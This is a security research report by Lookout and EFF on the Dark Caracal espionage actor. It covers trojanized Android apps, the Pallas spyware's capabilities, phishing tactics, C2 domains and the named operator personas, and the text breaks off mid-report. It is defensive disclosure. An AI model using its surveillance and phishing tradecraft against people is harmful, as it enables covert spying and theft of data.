{
    "id": "b61f19de-d26e-4a48-bc08-3213e9dff392",
    "created_at": "2022-10-25T16:48:22.534812Z",
    "updated_at": "2025-03-27T02:17:11.162087Z",
    "deleted_at": null,
    "sha1_hash": "d5c605fd42adb5312d17a54d246d8178a6a9094c",
    "title": "Dark Caracal Cyber-espionage at a Global Scale",
    "authors": "Lookout",
    "file_creation_date": "2018-01-17T10:12:52Z",
    "file_modification_date": "2018-01-17T10:13:02Z",
    "file_size": 43713089,
    "plain_text": "**SECURITY RESEARCH REPORT**\n\n## Dark Caracal\n\n###### Cyber-espionage at a Global Scale\n\n\n-----\n\n#### Contents\n\n###### Executive Summary 1\n\n**Key Findings** 2\n\n**Timeline** 2\n\n###### Background 4\n\n**Lebanon’s General Directorate of General Security (GDGS)** 4\n\n**Locating Attacker Facilities** 5\n\nTest Devices 5\n\nWi-Fi Networks 5\n\nLocation Information from IP Addresses 6\n\n**Identities: Attacker Personas** 7\n\nNancy Razzouk and Hassan Ward 7\n\nHadi Mazeh 8\n\nRami Jabbour 8\n\n###### Prolific Activity 9\n\n**Exfiltrated Data** 9\n\nAndroid Malware Content 12\n\nWindows Malware Content 15\n\n###### Patterns of Attacks 17\n\n**The Initial Compromise** 17\n\nSocial Engineering and Spear-Phishing 19\n\n\n**Surveillanceware — Mobile Capabilities** 21\n\nPallas — Dark Caracal’s Custom Android Samples 21\n\nC2 Communications with Malware Implants 23\n\nPrevious Use of FinFisher Spyware 30\n\n**Surveillanceware — Desktop Components** 31\n\nBandook 31\n\nCrossRAT 34\n\nInfected Documents 36\n\nOther Samples 37\n\n###### Infrastructure 38\n\n**Primary Command and Control Server** 39\n\n**Watering Hole Server** **41**\n\n**Phishing Domains** **41**\n\n**Windows C2 Servers** **44**\n\n###### Appendix 46\n\n**Indicators of Compromise and Actor Tracking** 46\n\nMobile Implant Apps 47\n\nDesktop Implant Apps 48\n\n\n-----\n\n### Executive Summary\n\nAs the modern threat landscape has evolved, so have the actors. The barrier to entry for cyber-warfare has continued to\n\ndecrease, which means new nation states — previously without significant offensive capabilities[1] — are now able to build and\n\ndeploy widespread multi-platform cyber-espionage campaigns.\n\nThis report uncovers a prolific actor with nation-state level advanced persistent threat (APT) capabilities, who is exploiting targets\n\nglobally across multiple platforms. The actor has been observed making use of desktop tooling, but has prioritized mobile\n\ndevices as the primary attack vector. This is one of the first publicly documented mobile APT actors known to execute espionage\n\non a global scale.\n\nLookout and Electronic Frontier Foundation (EFF) have discovered Dark Caracal[2], a persistent and prolific actor, who at the time\n\nof writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At\n\npresent, we have knowledge of hundreds of gigabytes of exfiltrated data, in 21+ countries, across thousands of victims. Stolen\n\ndata includes enterprise intellectual property and personally identifiable information. We are releasing more than 90 indicators\n\nof compromise (IOC) associated with Dark Caracal including 11 different Android malware IOCs; 26 desktop malware IOCs\n\nacross Windows, Mac, and Linux; and 60 domain/IP based IOCs.\n\nDark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military\n\ntargets, utilities, financial institutions, manufacturing companies, and defense contractors. We specifically uncovered data\n\nassociated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions\n\nduring this investigation. Types of data include documents, call records, audio recordings, secure messaging client content,\n\ncontact information, text messages, photos, and account data.\n\n[The joint Lookout-EFF investigation began after EFF released its Operation Manul report, highlighting a multi-platform espionage](https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf)\n\ncampaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev’s regime\n\nin Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android\n\ncomponent. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same\n\ninfrastructure is likely shared by multiple actors and is being used in a new set of campaigns.\n\nThe diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used\n\nsimultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has\n\ngiven no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the\n\ninfrastructure found to be hosting a number of widespread, global cyber-espionage campaigns.\n\nSince 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world.\n\nThis mobile espionage campaign is one of the most prolific we have seen to date. Additionally, we have reason to believe the\n\nactivity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted\n\nusing this infrastructure.\n\n1 [https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf](https://www.checkpoint.com/downloads/volatile-cedar-technical-report.pdf)\n\n2 In keeping with traditional APT naming, we chose the name “Caracal” (pronounced [kar-uh-kal]) because the feline is native to Lebanon and because this group has\n[remained hidden for so long. From the Wikipedia entry “the caracal is highly secretive and difficult to observe” and “is often confused with [other breeds of cat].” The](https://en.wikipedia.org/wiki/Caracal)\nnaming further builds on EFF’s “Operation Manul,” another feline reference. We like cats.\n\n\n-----\n\n###### Key Findings\n\n**Lookout and EFF researchers have identified a new threat actor,**\n\n**Dark Caracal.**\n\n - Our research shows that Dark Caracal may be administering its\n\ntooling out of the headquarters of the General Directorate of\n\nGeneral Security (GDGS) in Beirut, Lebanon.\n\n - The GDGS gathers intelligence for national security purposes and\n\nfor its offensive cyber capabilities according to previous reports.\n\n - We have identified four Dark Caracal personas with overlapping\n\nTTP (tools, techniques, and procedures).\n\n - Dark Caracal is using the same infrastructure as was previously\n\nseen in the Operation Manul campaign, which targeted journalists,\n\nlawyers, and dissidents critical of the government of Kazakhstan.\n\n**Dark Caracal has been conducting a multi-platform, APT-level**\n\n**surveillance operation targeting individuals and institutions globally.**\n\n - Dark Caracal has successfully run numerous campaigns in parallel\n\nand we know that the data we have observed is only a small\n\nfraction of the total activity.\n\n - We have identified hundreds of gigabytes of data exfiltrated from\n\nthousands of victims, spanning 21+ countries in North America,\n\nEurope, the Middle East, and Asia.\n\n - The mobile component of this APT is one of the first we’ve seen\n\nexecuting espionage on a global scale.\n\n - Analysis shows Dark Caracal successfully compromised the\n\ndevices of military personnel, enterprises, medical professionals,\n\nactivists, journalists, lawyers, and educational institutions.\n\n - Dark Caracal targets also include governments, militaries,\n\nutilities, financial institutions, manufacturing companies, and\n\ndefense contractors.\n\n - Types of exfiltrated data include documents, call records, audio\n\nrecordings, secure messaging client content, contact information,\n\ntext messages, photos, and account data.\n\n\n###### Dark Caracal Activity Timeline\n\n\n**Jan. 2012**\n\n**Nov. 2012**\n\n**Mar. 2014**\n\n**Nov. 2014**\n\n**Dec. 2015**\n\n**Jun. 2015**\n\n**Jun. 2016**\n\n**Aug. 2016**\n\n\nFirst mobile surveillance\n\ncampaign, oldb, launched\n\nop13@mail[.]com registers phishing\n\ndomain arablivenews[.]com\n\nCustom FinFisher mobile\n\nsample created\n\narablivenews[.]com expires and\n\nis decommissioned\n\nop13@mail[.]com registers\n\narabpublisherslb[.]com domain\n\nOperation Manul phishing\n\nemails first seen\n\ngmailservices[.]org and\n\ntwiterservices[.]org WHOIS\n\ndetails registered as Hadi\n\nMazeh and op13@mail[.]com\n\nEFF releases “Operation Manul” report\n\n\n**Oct. 2016** op13@mail[.]com registered\n\narablivenews[.]com. Threat\n\nConnect report[3] suggests\n\ndomain may be related to “APT 28”\n\n\n**Dec. 2016**\n\n\nsecureandroid[.]info watering\n\nhole goes live.\n\n\n**Dec. 2016** Second mobile surveillance\n\ncampaign, wp7, launched\n\n\n-----\n\n - Dark Caracal follows the typical attack chain for cyber-espionage.\n\nThey rely primarily on social media, phishing, and in some cases\n\nphysical access to compromise target systems, devices, and accounts.\n\n**Dark Caracal uses tools across mobile and desktop platforms.**\n\n - Dark Caracal uses mobile as a primary attack platform.\n\n - Dark Caracal purchases or borrows mobile and desktop tools from\n\nactors on the dark web.\n\n - Lookout discovered Dark Caracal’s custom-developed mobile\n\nsurveillanceware (that we call Pallas) in May 2017. Pallas is found in\n\ntrojanized Android apps.\n\n - Dark Caracal has also used FinFisher, a tool created by a “lawful\n\nintercept” company that is regularly abused by other nation-state actors.\n\n - Dark Caracal makes extensive use of Windows malware called\n\nBandook RAT. Dark Caracal also uses a previously unknown, multi\nplatform tool that Lookout and EFF have named CrossRAT, which is\n\nable to target Windows, OSX, and Linux.\n\n**Dark Caracal uses a constantly evolving, global infrastructure.**\n\n - Lookout and EFF researchers have identified parts of Dark\n\nCaracal’s infrastructure, providing us with unique insight into\n\nits global operations.\n\n - The infrastructure operators prefer to use Windows and XAMPP\n\nsoftware on their C2 servers rather than a traditional LAMP stack, which\n\nprovides a unique fingerprint when searching for related infrastructure.\n\n - Lookout and EFF have identified infrastructure shared by\n\nOperation Manul and Dark Caracal as well as other actors.\n\n - Attributing Dark Caracal was difficult as the actor employs\n\nmultiple types of malware, and our analysis suggests the\n\ninfrastructure is also being used by other groups.\n\n**Lookout and EFF are releasing more than 90 indicators of**\n**compromise (IOC):**\n\n - 11 Android malware IOCs\n\n - 26 desktop malware IOCs\n\n - 60 domains, IP Addresses, and WHOIS information\n\n\n###### Dark Caracal Activity Timeline (cont.)\n\n\n**Mar. 2017**\n\n**Apr. 2017**\n\n**Jun. 2017**\n\n**Jul. 2017**\n\n**Jul. 2017**\n\n**Jul. 2017**\n\n**Aug. 2017**\n\n**Aug. 2017**\n\n**Aug. 2017**\n\n**Sep. 2017**\n\n**Sep. 2017**\n\n**Dec. 2017**\n\n**Jan. 2018**\n\n\nThird mobile surveillance\n\ncampaign, wp8, launched\n\nFourth mobile surveillance\n\ncampaign, wp9, launched\n\nFifth and sixth mobile surveillance\n\ncampaigns, wp10 and wp10s, launched\n\nwp8 campaign ceases collecting data\n\nadobeair[.]net taken down for\n\nseveral dayss\n\nadobeair[.]net resumes operations\n\nwp9, wp10, and wp10s campaigns\n\ncease collecting data\n\nadobeair[.]net WHOIS details\n\nchanged to Nancy Razzouk,\n\nop13@mail[.]com, Lebanon\n\noldb campaign ceases collecting data\n\nwp7 campaign ceases collecting data\n\nadobeair[.]net changes hosting\n\nand is secured against data leaks\n\nSecureanroid[.]info’s domain\n\nname expires\n\nDark Caracal made public\n\n\n-----\n\n### Background\n\n###### Lebanon’s General Directorate of General Security (GDGS)\n\nDevices for testing and operating the campaign were traced back to a building\n\nbelonging to the Lebanese General Directorate of General Security (GDGS), one of\n\nLebanon’s intelligence agencies. Based on the available evidence, it is likely that the\n\nGDGS is associated with or directly supporting the actors behind Dark Caracal.\n\n###### Previous Cyberespionage\n\nEFF first identified elements of this infrastructure in its August 2016[4] report on Operation\n\nManul. The report details a series of attacks targeting journalists and political activists\n\ncritical of Kazakhstan’s authoritarian government, along with their family members,\n\nlawyers, and associates. EFF’s research noted references to Android components found\n\non the infrastructure; however, no samples had been discovered at the time of the\n\nreport’s release. Lookout has since acquired Android samples used by Dark Caracal that\n\nbelong to what Lookout researchers have named the Pallas malware family.\n\nCitizen Lab previously flagged the General Directorate of General Security in a 2015\n\nreport as one of two Lebanese government organizations using the FinFisher spyware[5].\n\nThe report cites evidence showing that the GDGS, along with other state actors around\n\nthe world, had active campaigns using FinFisher infrastructure and tools. However, the\n\nreport did not specify whether the spyware used was the mobile version of FinFisher.\n\nOur investigation resulted in the discovery of at least one FinFisher implant for Android,\n\nwhich corroborates Citizen Lab’s previous research. The sample’s hash is provided in\n\nthe appendix of this report. We also uncovered new desktop surveillance software\n\ndeveloped potentially by Dark Caracal themselves, a developer associated with the\n\nGDGS, or a private contractor group.\n\nThe intent of bringing forth these findings is to reveal newly discovered evidence of a new\n\nnation-state actor compromising the devices of military personnel, enterprises, medical\n\nprofessionals, activists, journalists, lawyers, and educational institutions. Our review and\n\ndisclosure of this matter follows industry practices, including sharing our findings with\n\nappropriate government authorities, industry partners and the public at large.\n\n4 [https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf](https://www.eff.org/files/2016/08/03/i-got-a-letter-from-the-government.pdf)\n\n5 [https://citizenlab.ca/2015/10/mapping-finfishers-continuing-proliferation/](https://citizenlab.ca/2015/10/mapping-finfishers-continuing-proliferation/)\n\n\n-----\n\n###### Locating Attacker Facilities\n\nWe correlated information from test devices and Wi-Fi networks to determine\n\nthe location of Dark Caracal’s facilities.\n\n###### Test Devices\n\nDark Caracal used a series of test devices to confirm that its malware implants\n\nand C2 infrastructure work correctly. Identifying these devices helped us to\n\ndetermine Dark Caracal’s likely location inside the GDGS building.\n\nDistinguishing between test and target devices can be tricky. After analyzing\n\ndata from the infrastructure, we noticed that a subset of the compromised\n\ndevices contained similar email, Viber, Primo, Telegram, and Whatsapp accounts.\n\nThese data points allowed us to focus on a select few devices that were unique\n\namong the thousands we saw. Additionally, these devices contained a minimal\n\namount of (if any) real content in the exfiltrated text messages, contacts, and\n\napplication data, which led us to conclude they were likely test devices.\n\n###### Wi-Fi Networks\n\n\n**Figure 1: A picture of the GDGS building in**\n\nBeirut, Lebanon from where we have located\n\nDark Caracal operating\n\n\nWithin the cluster of test devices we noticed what could be unique Wi-Fi networks. Knowing that Wi-Fi networks can be used for\n\nlocation positioning, we used that data to geo-locate where these devices may have been by keying off network identifiers. We\n\nspecifically focused on the Wi-Fi network SSID Bld3F6. Using the Wi-Fi geolocation service Wigle.net we saw these test device\n\nWi-Fi networks mapped to Beirut. We also noticed Wi-Fi networks with SSID Bld3F6 mapped near the General Security building\n\nin Beirut, Lebanon.\n\n**Figure 2: Google map of the GDGS Building in Beirut**\n\nLeft: Data as observed from Wigle.net for SSID: Bld3F6 | Right: Data confirming location of SSID: Bld3F6\n\n\n-----\n\n###### Location Information from IP Addresses\n\nThroughout the course of this investigation we observed logins into the administrative console of the C2 server come from three\n\nIP addresses. The IP addresses are all from Ogero Telecom[6], which is owned by the Government of Lebanon. We geo-located two\n\nof the IP addresses just south of the GDGS’s building (probably a switching or central hub for Ogero).\n\n**Figure 3: The location of IP addresses that logged into the adobeair[.]net admin console between July and September 2017**\n\n6 [https://en.wikipedia.org/wiki/Telecommunications in Lebanon](https://en.wikipedia.org/wiki/Telecommunications_in_Lebanon)\n\n\n-----\n\n###### Identities: Attacker Personas\n\nThe infrastructure used by Dark Caracal revealed several different associated personas. This resulted in the team linking four\n\ndifferent aliases, two domains, and two phone numbers to this infrastructure. At the center of these personas is the email\n\naddress op13@mail[.]com which has appeared at various stages in the historical WHOIS information of Dark Caracal domains\n\n(see: Timeline).\n\nAliases associated with op13@mail[.]com include Nancy Razzouk, Hadi Mazeh, and Rami Jabbour. All of the physical addresses\n\nlisted in the WHOIS domain registrations associated with op13@mail[.]com tend to cluster around the SSID: Bld3F6 Wi-Fi\n\nlocations. This is near the General Security building in Beirut.\n\n###### Nancy Razzouk and Hassan Ward\n\nWe identified Nancy Razzouk listed alongside the op13@mail[.]com email address in domain WHOIS information. We also found\n\nthis name in signer content for the Windows malware[7] that communicates with adobeair[.]net.\n\n**Figure 4: Signer content for Windows malware**\n\nThe contact details for Nancy present in WHOIS information matched the public listing for a Beirut-based individual by that\n\nname. When we looked at the phone number associated with Nancy in the WHOIS information, we discovered the same number\n\nlisted in exfiltrated content and being used by an individual with the name Hassan Ward.\n\n7 SHA-256 HASH: d57701321f2f13585a02fc8ba6cbf1f2f094764bfa067eb73c0101060289b0ba\n\n\n-----\n\n###### Hadi Mazeh\n\nDuring July 2017, Dark Caracal’s internet service provider took the adobeair[.]net command and control server offline. Within\n\na matter of days, we observed it being re-registered to the email address op13@mail[.]com with the name Nancy Razzouk. This\n\nallowed us to identify several other domains listed under the same WHOIS email address information, running similar server\n\ncomponents. The WHOIS name field, however, listed several entries with the name Hadi Mazeh. This suggests that either multiple\n\nindividuals are using the op13 email address or the owner has several aliases that he or she uses with it.\n\nop13@mail.com\n\n**Hadi Mazeh**\n\nfbarticles.com arabpublisherslb.com\n\ngmailservices.org facebookservices.org\n\ntwiterservices.org\n\n**Figure 5: Aliases associated with the op13 email address**\n\n###### Rami Jabbour\n\nWe determined the actor behind the op13 email address also registered the domain arablivenews[.]com and provided the name\n\nRami Jabbour. Address details listed in WHOIS information for this specific entry are Salameh Blg, Museum Str, and Mathaf, which\n\nappears to be in close proximity to where we have seen test devices in Beirut.\n\n\n-----\n\n### Prolific Activity\n\nThroughout this investigation, Lookout and EFF researchers have gained unique insight into the global operations of Dark\n\nCaracal. This has primarily been possible due to command and control infrastructure operators allowing public access to data\n\nstolen from compromised devices and systems.\n\nSince we first gained visibility into attacker infrastructure in July 2017, we have seen millions of requests being made to it from\n\ninfected devices. This demonstrates that Dark Caracal is likely running upwards of six distinct campaigns in parallel, some of\n\nwhich have been operational since January 2012.\n\nDark Caracal targets a broad range of victims. Thus far, we have identified members of the military, government officials, medical\n\npractitioners, education professionals, academics, civilians from numerous other fields, and commercial enterprises as targets.\n\n###### Exfiltrated Data\n\n SMS Account Wi-Fi\n\n*********\n\n###### Messages Information Details\n\n Call Bookmarks & WhatsApp, Telegram Records Browsing History and Skype databases\n\n Contacts Installed Legal and Corporate\n Applications Documentation\n\n Images Audio File and Directory\n Recordings Listings\n\n**Figure 6: A summary of some of the types of content Dark Caracal exfiltrated from victims on both Android and Windows**\n\nNot only was Dark Caracal able to cast its net wide, it was also able to gain deep insight into each of the victim’s lives. It did this\n\nthrough a series of multi-platform surveillance campaigns that began with desktop attacks and pivoted to the mobile device.\n\nStolen data was found to include personal messages and photos as well as corporate and legal documentation. In some cases,\n\nscreenshots from its Windows malware painted a picture of how a particular individual spent his evenings at home.\n\n\n-----\n\nWe found the largest collection of data from a single command and control server that operated under the domain adobeair[.]\n\n**net. Over a short period of observation, devices from at least six distinct Android campaigns communicated with this domain**\n\nresulting in 48GB of information being exfiltrated from compromised devices. Windows campaigns contributed a further 33GB of\n\nstolen data. The remainder of the data contained desktop malware samples, spreadsheet reports on victims, and other files.\n\n**Figure 7: Split of exfiltrated data found**\n\non just the command and control server\n\nadobeair[.]net. From 81GB of stolen\n\n###### Split of exfiltrated content on adobeair.net data, the majority was found to be from\n\ncampaigns run against mobile devices\n\n###### 59.3%\n\n# 81 GB\n\n###### Android Campaigns\n\n##### 81 GB\n\n###### 40.7%\n\n Windows Campaigns\n\nVictims were found to speak a variety of languages and were also from a wide range of countries. We discovered messages\n\nand photos in Arabic, English, Hindi, Turkish, Thai, Portuguese, and Spanish in the examined data. According to our analysis,\n\ninfrastructure contained exfiltrated data from individuals residing in:\n\n\n-----\n\n**Figure 8: Observed locations of compromised devices**\n\nBased on both the mobile and desktop campaigns we observed, we believe the attacker first exfiltrated information in January\n\n2012. At the time of writing this report, it looks as though Dark Caracal is still uploading data from its spy campaigns, according\n\nto the servers we are tracking.[8]\n\n**Figure 9: Amount of exfiltrated content (as represented by “count” in the graph above) being uploaded for certain campaigns on adobeair[.]net over time for 2017**\n\n8 Despite the internet service provider taking the command and control server down in July 2017, the infrastructure reappeared online again after a few days. The dip\nin data exfiltration due to the takedown can be observed in Figure 9 at the beginning of August. The average number of files uploaded to the server increases steadily\nwith time\n\n\n-----\n\n###### Android Malware Content\n\nThe Android malware family mainly trojanizes messaging and security applications and, once it compromises a device, it is\n\ncapable of collecting a range of sensitive user information. This includes recorded audio, call logs, conversations from popular\n\nchat applications, location information, browsing history, device specific metadata, contacts, and much more.\n\nEach Android malware sample contains a hard coded identifier that we believe represents the campaign to which it belongs.\n\nWhen a Dark Caracal operator instructs an infected device to upload sensitive data, it is stored on the attacker infrastructure\n\nunder this campaign. While investigating this adversary, we observed content distributed across six different campaigns. In\n\nthis report, we refer to these campaigns by the name of the directory to which infected devices uploaded victim data. These\n\ncampaigns are listed below, along with the number of victim devices we believe Dark Caracal compromised while we were\n\nobserving its operations:\n\n\n\n_•_ _/oldb - 28 perceived test devices, 454 potential victim devices_\n\n_•_ _/wp7 - 4 perceived test devices, 117 potential victim devices_\n\n_•_ _/wp8 - 1 perceived test device, 4 potential victim devices_\n\n\n\n_•_ _/wp9 - 11 potential victim devices_\n\n_•_ _/wp10 - 1 potential test device, 2 potential victim devices_\n\n_•_ _/wp10s - 13 potential test devices, 21 potential victim devices_\n\n\nWe did not attempt to identify targets and consider that beyond the scope of this report.\n\n###### An overview of exfiltrated data from the Android campaigns can be seen in the figure below.\n\n 264,535\nFiles\n\n17.6%\n\n###### 46\nDirectories\n\n0.0%\n\n###### 206,461\nUnique Wi-Fi SSIDs\n\n13.8%\n\n********* **1547**\n\nAuthentication Accounts\n\n0.1%\n\n###### 92,35\nBrowsing History URLs\n\n6.2%\n\n###### 45,264\nAndroid Application\nDetails **150,266**\n\nCall Records\n\n3.0%\n\n10.0%\n\n**Figure 10: Distribution of data from the Android campaigns**\n\n\n-----\n\n**Exfiltrated data can be divided into the following categories of information:**\n\n - **SMS messages - SMS messages made up some of the more meaningful exfiltrated data. Messages included personal texts,**\n\ntwo-factor authentication and one-time password pins, receipts and airline reservations, and company communications.\n\nSome pin codes were within their validity window at the time of writing this report.\n\n**Figure 11: Exfiltrated SMS texts detailing OTPs, receipts, and Facebook notifications**\n\n\n-----\n\n- **Contact Lists - This data included numbers, names, addresses, bank passcodes, PIN numbers, how many times each contact**\n\nwas dialed, and the last time the contact was called.\n\n**Figure 12: Contacts exfiltrated from 3 victims’ Android devices can be seen to contain corporate numbers, personal numbers, and Visa credit card numbers**\n\n- **Call logs - This data included a full record of incoming, outgoing, and missed calls along with the date and duration**\n\nof the conversation.\n\n- **Installed Applications - This data included app names and version numbers.**\n\n- **Bookmarks and Browsing History - This data included bookmarks and browsing history from web pages. This data was**\n\nseen in only one Android campaign called oldb, but it clearly identified victims that were active in political discourse.\n\n- **Connected Wi-Fi Details - This data included observed Wi-Fi access point names, BSSIDs, and signal point strength.**\n\n- **Authentication Accounts - This data included the login credentials and which applications are using it.**\n\n- **File and Directory Listings - This data included a list of personal files, downloaded files, and temporary files, including**\n\nthose used by other applications.\n\n- **Audio Recordings and Audio Messages - This data included audio recordings of conversations, some of which identified**\n\nindividuals by name.\n\n- **Photos - This data included all personal and downloaded photographs, including profile pictures.**\n\n\n-----\n\n###### Windows Malware Content\n\nDark Caracal’s use of Windows malware includes a wider range of command and control infrastructure beyond adobeair[.]net.\n\nIts methods and data collection, however, are similar to the Android malware.\n\n**Exfiltrated data from the Windows malware included the following general categories:**\n\n - **Desktop Screenshots - This data included full screenshots taken at regular intervals and uploaded to adobeair[.]net.**\n\nBy observing these images, it is disturbingly simple to watch a victim go about his daily life and follow that individual\n\nevery step of the way.\n\n**Figure 13: A screenshot exfiltrated from victim’s Windows device on adobeair[.]net**\n\n - **Skype Logs Databases - The data included the entire Skype AppData folder for certain victims, including messaging**\n\ndatabases.\n\n - **Photos - This data included complete contents of the ‘Pictures’ folder from compromised Windows machines. It is common**\n\nto see smartphone photos backed up to this location, which most often contains personal photographs of family and friends\n\ntaken by the individual being targeted.\n\n\n-----\n\n - **iPhone Backups - This data included an entire unencrypted backup of a victim’s iPhone.**\n\n - **File Listings - This data included all default Windows folders and file listings.**\n\n - **Corporate and Legal Documentation - This data included a large collection of company-specific documents. Specifically,**\n\nwe discovered these on another live command and control server, planethdx[.]com.\n\n**Figure 14: An example of corporate documentation, which details the addresses and telephone numbers of customers for a shipping company**\n\n\n-----\n\n### Patterns of Attacks\n\nDark Caracal follows the typical attack chain for client-side cyber-espionage. Mobile tools include a custom written Android\n\nsurveillanceware implant Lookout named Pallas[9] and a previously unknown FinFisher sample. The group’s desktop tools include\n\nthe Bandook malware family and a newly discovered desktop surveillanceware tool that we have named CrossRAT, which is able\n\nto infect Windows, Linux, and OS X operating systems.\n\n###### The Initial Compromise\n\n**Physical access** **Phishing messages** **Phishing messages**\nWhatsApp Facebook group\n\n\n**Trojanized Android Apps**\n\n\nExfiltrated\n\nData\n\n**Figure 15: The Android malware infrastructure**\n\nis designed to attract victims into the campaign\n\nthrough two different mechanisms: phishing\n\n**C2 server** campaigns that separately lead to a watering hole\nadobeair[.]net\n\nserver (secureandroid[.]info) and a server designed\n\nto accept credentials via a spoofed login\n\nDark Caracal relies primarily on social engineering via posts on a Facebook group and WhatsApp messages in order to\n\ncompromise target systems, devices, and accounts. At a high-level, the attackers have designed three different kinds of phishing\n\nmessages, the goal of which is to eventually drive victims to a watering hole controlled by Dark Caracal.\n\n\n-----\n\nThe group distributes trojanized Android\n\napplications with the Pallas malware through its\n\nwatering hole, secureandroid[.]info. Many of these\n\ndownloads include fake messaging and privacy\noriented apps.\n\nThere is also some indication that Dark Caracal\n\nhas used physical access in the past to install the\n\nAndroid malware.\n\n\n**Figure 16: secureandroid[.]info’s app download page**\n\n**Figure 17: A text message found**\n\nfrom a possible victim’s device\n\n\n-----\n\n###### Social Engineering and Spear-Phishing\n\nDark Caracal uses phishing messages through popular applications, such as WhatsApp, in order to direct people to the\n\nwatering hole.\n\n**Figure 18:**\n\nLeft: Extracted from WhatsApp\n\nmessages database\n\nRight: Facebook group links to\n\nwatering hole\n\nDark Caracal infrastructure hosts phishing sites, which look like login portals for well known services, such as Facebook, Twitter,\n\nand Google. We found links to these pages in numerous Facebook groups that included “Nanys” in their titles. These groups are\n\nlisted in the appendix.\n\n**Figure 19: Dark Caracal**\n\ncredential phishing portals\n\n\n-----\n\nGoogle has indexed several of these phishing campaigns from the tweetsfb[.]com server. We were able to link a number of\n\nphishing domains dating to the mid-to-late 2016 time period from this data. We believe the attackers used these phishing servers\n\nto capture login credentials, hijack accounts, and to push out more spoofed messages to widen their pool of victims.\n\n**Figure 20: Google indexing of tweetsfb[.]com campaigns**\n\nPhishing links posted in Dark Caracal linked Facebook groups include politically themed news stories, links to fake versions of\n\npopular services, such as Gmail, and links to trojanized versions of WhatsApp.\n\n**Figure 21: Dark Caracal phishing links posted on Facebook**\n\n\n-----\n\nFour Facebook profiles similar in theme “liked” the phishing groups. Dark Caracal likely used these fake profiles to initiate\n\ncommunication with victims and build a rapport before directing them either to content on the “Nanys” Facebook groups\n\nor to the secureandroid[.]info domain directly.\n\n**Figure 22: Dark Caracal fake Facebook profiles**\n\n###### Surveillanceware — Mobile Capabilities\n\n Pallas — Dark Caracal’s Custom Android Samples\n\nUsing our global sensor network, Lookout researchers identified 11 unique Android surveillanceware apps tied to the Operation\n\nManul campaign[10]. The trojanized apps still retain the legitimate functionality of the apps they spoof and behave as intended.\n\nThe apps are found predominantly in trojanized versions of well-known secure messaging apps including:\n\n - Signal (org.thoughtcrime.securesms)\n\n - Threema (ch.threema.app)\n\n - Primo (com.primo.mobile.android.app)\n\n - WhatsApp (com.gbwhatsapp)\n\n - Plus Messenger (org.telegram.plus)\n\nWe also identified Pallas in trojanized versions of two apps aimed at users seeking to protect themselves and their data online:\n\n - Psiphon VPN (com.psiphon3)\n\n - Orbot: TOR Proxy (org.torproject.android)\n\n\n-----\n\nFinally, with help from Google’s Android Security team, we discovered Pallas lurking in several apps purporting to be Adobe Flash\n\nPlayer and Google Play Push for Android:\n\n - Flash Player (com.flashplayer.player)\n\n - Google Play Push (com.flashplayer.player)\n\n**Primo** **Threema** **Psiphon** **Signal**\n\n**Orbot** **Plus**\n**TOR Proxy** **WhatsApp** **Messenger**\n\n**Figure 23: Dark Caracal trojanized Android apps**\n\nNeither the desktop nor the mobile malware tooling use zero day vulnerabilities. Pallas samples primarily rely on the permissions\n\ngranted at installation in order to access sensitive user data. However, there is functionality that allows an attacker to instruct an\n\ninfected device to download and install additional applications or updates. Theoretically this means it’s possible for the operators\n\nbehind Pallas to push specific exploit modules to compromised devices in order to gain complete access.\n\nWe found no attacker infrastructure containing rooting packages. This highlights that, in many cases, advanced exploitation\n\n\n**Primo**\n\n\n**WhatsApp**\n\n\n**Threema**\n\n\n**Psiphon**\n\n\n[capabilities like those shown by surveillance tools such as Pegasus for iOS and Chrysaor for Android (that targeted both Android](https://blog.lookout.com/pegasus-android)\n\n\n**Signal**\n\n\n**Orbot**\n**TOR Proxy**\n\n\n11\n\n\n**Plus**\n**Messenger**\n\n\nand iOS\n\n\n[12 devices), are not essential, but helpful when targeting certain platforms.](https://blog.lookout.com/trident-pegasus)\n\n\n[11 https://blog.lookout.com/pegasus-android](https://blog.lookout.com/pegasus-android)\n\n12 [https://blog lookout com/trident-pegasus](https://blog.lookout.com/trident-pegasus)\n\n\n-----\n\nThe Pallas first stage is capable of performing the following surveillance functionality on a compromised device:\n\n\n\n - Take photos with front or back camera\n\n - Exfiltrate all text messages including those\n\nreceived in the future\n\n - Retrieve latitude / longitude from GPS\n\n - Silently activate the device microphone to\n\ncapture audio\n\n - Retrieve contacts\n\n - Scan nearby Wi-Fi access points and exfiltrate\n\ninformation about them, including their BSSID, SSID,\n\nauthentication, key management, encryption schemes,\n\nsignal strength, and frequency\n\n - Retrieve chat content from secure messaging\n\napplications (this only applies when a victim is using\n\na secure messaging app that has been trojanized\n\nwith Pallas)\n\n###### C2 Communications with Malware Implants\n\n\n\n- Retrieve device metadata\n\n- Retrieve text messages\n\n- Retrieve information about all accounts\n\n- Send an SMS to an attacker-specified number\n\n- Retrieve call logs\n\n- Retrieve messages and any corresponding\n\ndecryption keys from messaging apps\n\n- Retrieve a list of installed packages\n\n- Download and install additional apps\n\n- Upload attacker specified files\n\n- Delete attacker specified files and directories\n\n- Harvest credentials via phishing pop-ups\n\n\nAll samples belonging to the Pallas malware family have the same capabilities and functionality described in the previous\n\nsection. However, obfuscation did differ between them. For reference, code snippets shown in the following section\n\nhave been taken from a trojanized version of WhatsApp with a package name of com.gbwhatsapp and a SHA1 hash of\n\n**ed4754effda466b8babf87bcba2717760f112455.**\n\nLike most other surveillanceware, communication with the C2 includes three main phases:\n\n**1.** Regular beaconing to the remote HTTP server.\n\n**2.** Handling any outstanding attacker specified commands.\n\n**3.** Exfiltration / uploading of victim data to C2 servers.\n\nPallas samples have a number of different entry points via broadcast receivers, specifically the C2 communications reside\n\nin the com.receive.MySe.\n\n\n-----\n\n**Figure 24: Actions that 